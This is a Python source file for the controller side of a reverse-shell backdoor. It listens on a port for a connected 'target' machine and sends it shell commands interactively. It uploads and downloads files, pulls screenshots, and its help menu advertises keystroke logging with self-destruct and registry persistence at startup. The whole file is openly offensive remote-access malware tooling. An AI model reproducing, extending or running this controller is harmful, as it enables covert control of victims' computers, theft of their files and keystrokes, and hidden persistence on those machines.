import socket
import termcolor
import json
import os

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                    --> Quit session with the Target
            clear                                   --> Clear the Screen
            cd *Directory Name*                     --> Changes directory on target system
            upload *File Name*                      --> Upload file to the target machine
            download *File Name*                    --> Download file from target machine
            keylog_start                            --> Start the KeyLogger
            keylog_dump                             --> Print KeyStrokes that the target inputted
            keylog_stop                             --> Stop and self destruct KeyLogger file
            presistence *RegName* *FileName*        --> Create Persistence in registry (starting automatically on startup)'''),'green')
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPv4 and TCP connection
sock.bind(('127.0.0.1', 5555))
print(termcolor.colored('[+] Listening for the incoming Connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))
target_communication()
